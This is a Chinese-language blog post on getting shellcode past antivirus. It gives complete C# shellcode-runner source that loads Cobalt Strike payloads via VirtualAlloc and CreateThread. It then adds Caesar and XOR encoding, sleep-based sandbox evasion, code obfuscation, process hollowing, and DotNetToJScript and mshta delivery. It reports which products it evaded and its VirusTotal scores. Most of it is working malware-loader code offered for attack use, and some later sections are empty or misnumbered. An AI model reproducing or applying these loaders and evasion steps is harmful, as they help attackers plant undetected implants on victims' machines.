---
layout: post
title: Shellcode Bypass AV

---



# Shellcode Bypass AV

## 0x01.Make a shellcode runner

本文用c#来完成实现shellcode runner，首先要知道如何使用c#调用windows API，C#调用win32 API一般使用P/Invoke的方法在DLL中使用win32api

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210828122140.png)

比如实现一个简单的messagebox功能，要先把c的数据类型转换为c#的数据类型，完整代码如下

```c#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
namespace ConsoleApp1
{
 class Program
 {
 [DllImport("user32.dll", CharSet = CharSet.Auto)]
 public static extern int MessageBox(IntPtr hWnd, String text, String caption, 
int options);
 static void Main(string[] args)
 {
 MessageBox(IntPtr.Zero, "This is a messagebox", "This is my caption", 0);
 }
 }
}
```

实现shellcode加载器的话，首先需要三个windows API函数VirtualAlloc（主要用来实现调用进程的虚地址空间）

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210828123343.png)

CreateThread（创建线程函数）

WaitForSingleObject （等待线程结束后再执行其他）具体原因后文会说

使用使用P/Invoke的方法在DLL中加入这三个windows API，然后用cobaltstrike生成c#的shellcode

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210830212058.png)

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210830213005.png)

shellcode runner完整代码如下

```c#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
namespace ShellcodeRunner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
       flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
       IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
       dwMilliseconds);
        static void Main(string[] args)
        {
            /* length: 894 bytes */
            byte[] buf = new byte[894] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0...............};

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0,

IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);//让程序执行完毕shellcode后再结束
        }
    }
}
```

火绒测试一下，meterpreter的特征

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210830220719.png)

测试下程序运行，没有问题可以直接上线CS

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210830220839.png)

## 0x02.Encoded Shellcode

### Caesar加密

尝试使用Caesar加密方式来绕过Av，整个shellcode右移5

```c#
byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 5) & 0xFF);
            }
```

输出的生成的shellcode，此时shellcode已经被改变过了，那么再做一步解密的操作

```c#
 for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 5) & 0xFF);
            }
```

下面再改成左移5，然后编译shellcodeRunner，火绒再次报毒meterpreter的特征

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210831223458.png)

### XOR加密

凯撒密码的加密方式过于简单，尝试使用XOR加密的方式加密shellcode

```c#
        byte[] encoded = new byte[buf.Length];
        for (int i = 0; i < buf.Length; i++)
        {
            encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
        }
```

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210831225103.png)

完整代码如下

```c#
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace XorShellcodeRunner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
 uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
        UInt32 dwMilliseconds);
        static void Main(string[] args)
        {
            //上面是加密过的shellcode
            byte[] buf = new byte[894] {
0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x32, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 
};

            for (int i = 0; i < buf.Length; i++)
           {
            buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }
            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
            IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
    
        }
    }

}
```

Cobaltstrike 上线没有问题

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210831230322.png)

文件上传到VT上测试一下，18/64个给标记了，所以说简单的加密shellcode也是可以起到一定静态免杀的效果

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210831231753.png)

## 0x03.时间判断

如果在程序中加入一个延时效果，是否能够绕过Av的动态检测

首先加入sleep API

```c
[DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);
```

Sleep 代码片段

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210903113707.png)

加入sleep主要是对动态如沙盒的一个测试，保证沙盒运行的时候，如果没有按照我们的时间运行就退出，停止运行shellcode，不过本身的特征还是存在

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210903102751.png)

生成exe后反编译测试，或者使用调试16进制编辑器查看，还是可以看到明显特征

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210903100940.png)

对sharp代码进行混淆，成功Bypass

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210903103224.png)

使用windows defender静态扫描测试

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210903112347.png)

该defender为测试时的最新版本

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210903112454.png)

## 0x05.进程镂空

常规做进程注入的时候会选择使用explorer.exe或者是notepad.exe的进程。常规迁移进程的时候也可以选择svchost.exe进程，这个进程一般都会有外连的行为（网络活动进程）

svchost进程一般是system权限运行，所以低权限无法注入到高权限进程中，所以可以选择启动svchost进程然后修改进程，再执行我们的恶意shellcode，让程序在没有结束的时候上线

听起来比较复杂，可以直接看图

1.创建新的虚拟内存空间

2.给线程TEB和进程PEB分配堆栈

3.把exe或者是dll文件加载到内存中

首先需要一个创建进程的api，CreateProcess

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210906144823.png)

360的云查杀在一段时间后会把马杀掉，但是notepad.exe的进程还在，meterpreter起一个交互式shell

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210906144946.png)

可以看到notepad.exe也启动了一个cmd.exe

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210906145110.png)

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210906145225.png)

## 0x06.DoNetToJscript

把代码放到DotNetToJscript中

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210906151026.png)

```
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4,v2 -o runner.js
```

编译生成js代码

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210906151426.png)

然后通过wscript runner.js 执行即可上线

## 0x07.MSHTA Bypass AV

在某些具体攻防场景中，可以直接使用mshta的上线方法，比如使用无回显可出网命令执行的情况，可以使用如下方法，mshta的具体免杀效果取决于js的免杀效果，在本文上一节，已经把木马转换成js，并且加密，所以mshta的效果也比较好







## 0x08.MSHTA Bypass AV

0x06.签名注入shellcode

![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210908171430.png)

